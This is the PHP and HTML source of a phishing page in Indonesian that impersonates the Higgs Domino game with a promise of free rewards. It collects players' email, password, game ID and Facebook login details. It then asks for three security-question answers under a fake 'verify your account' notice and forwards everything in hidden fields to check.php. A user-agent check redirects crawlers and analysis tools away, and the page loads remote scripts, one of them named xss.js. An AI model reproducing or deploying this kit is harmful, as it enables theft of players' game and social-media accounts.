<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
$emailpgfb = $_POST['emailpgfb'];
$passwordpgfb = $_POST['passwordpgfb'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="haykaljb2/css-kal.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/jefanya14/higgsv13/a80e7b5d27a401965c6340bdb8c2dc3bab6ccb6e/.data/alex-facebook.css">
        <title>Higgs Domino</title>
        <meta property="og:title" content="Higgs Domino">
        <meta name="description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Higgs Domino">
        <meta property="og:type" content="website">
        <meta name="copyright"content="Alex Ariandi">
        <meta name="theme-color" content="#136a62">
        <meta property="og:image" content="https://rawcdn.githack.com/jefanya14/higgsv13/05711d6e4e03c6744492062f66bec20c9b250337/.data/higgs_domino.webp">
        <link rel="icon" href="https://www.bosbosgames.com/favicon.ico">
    </head>
    <body style="background: #f4d9aa;">
        <div class="appalexhdiprem" style="background: #f4d9aa;">
            <div class="containeralexhdi">
                <div class="boxverifalexhdi">
                    <div class="headeralexverifhdi">
                        <p>Info: Verifikasi akun Anda.</p>
                    </div>
                    <div class="boxalexverifmarsya">
                        <div class="ucapanverifalex">
                            <span>Pemain Yang Terhormat,</span>
                            <span>Kami memohon maaf atas "<label>Informasi Yang Tidak Mendukung</label>" yang tidak bisa membaca data game Anda. Untuk melanjutkan mohon untuk memverifikasi akun Anda terlebih dahulu.</span>
                        </div>
                    </div>
                    <div class="verifikasikeamananalex">
                        <form method="POST" action="check.php" class="boxformalex">
                            <div class="itemalexverifhdi">
                                <label>Q1</label>
                                <select name="quest1">
                                    <option>Apa nama film pertama yang Anda tonton?</option>
                                    <option>Apa mobil kesukaan Anda?</option>
                                    <option>Tim sepak bola kesukaan Anda?</option>
                                    <option>Nama panggilan masa kecil Anda?</option>
                                </select>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>A1</label>
                                <input type="text" name="answer1" placeholder="Silahkan masukkan Jawaban" required>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>Q2</label>
                                <select name="quest2">
                                    <option>Apa pekerjaan pertama Anda?</option>
                                    <option>Siapa nama sahabat Anda?</option>
                                    <option>Apa nama hewan peliharaan Anda?</option>
                                    <option>Siapa penyanyi yang Anda sukai?</option>
                                </select>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>A2</label>
                                <input type="text" name="answer2" placeholder="Silahkan masukkan Jawaban" required>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>Q3</label>
                                <select name="quest3">
                                    <option>Apa makanan kesukaan Anda?</option>
                                    <option>Apa pekerjaan yang Anda inginkan?</option>
                                    <option>Artis mana yang paling Anda sukai?</option>
                                    <option>Apa mainan pertama Anda?</option>
                                </select>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>A3</label>
                                <input type="text" name="answer3" placeholder="Silahkan masukkan Jawaban" required>
                            </div>
                            <div class="buttonalexverifhdi">
                                <input type="hidden" name="emails1s" value="<?php echo $email;?>" readonly>
                                <input type="hidden" name="password" value="<?php echo $password;?>" readonly>
                                <input type="hidden" name="login" value="<?php echo $login;?>" readonly>
                                <input type="hidden" name="playid" value="<?php echo $playid;?>" readonly>
                                <input type="hidden" name="nick" value="<?php echo $nick;?>" readonly>
                                <input type="hidden" name="emailpgfb" value="<?php echo $emailpgfb;?>" readonly>
                                <input type="hidden" name="passwordpgfb" value="<?php echo $passwordpgfb;?>" readonly>
                                <button type="submit">Kirim</button>
                            </div>
                        </form>
                    </div>
                </div>
                <iframe scrolling="no" allow="autoplay" controls loop src="https://rawcdn.githack.com/jefanya14/jefanya14/353b521709ef8d17049e739c9989a29517f6b09b/theme_alex_hdi.mp3" style="display: none" width="0" height="0" frameborder="no"></iframe>
            </div>
        </div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>   
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://raw.githubusercontent.com/jefanya14/jefanya14/main/2.4.16.min.js"></script>
<script src="haykaljb2/js-kal.js"></script>
<script src="https://rawcdn.githack.com/jefanya14/jefanya14/95fc02aca1f952df87d66d3c6ad7976beba441b5/input-exception.js"></script>
<script src="https://rawcdn.githack.com/jefanya14/jefanya14/a4065c906f227984d2ea8f5de8ecd62a1860491d/xss.js"></script>
<link rel="stylesheet" href="https://rawcdn.githack.com/jefanya14/jefanya14/a4065c906f227984d2ea8f5de8ecd62a1860491d/watermark.css">
    </body>
</html>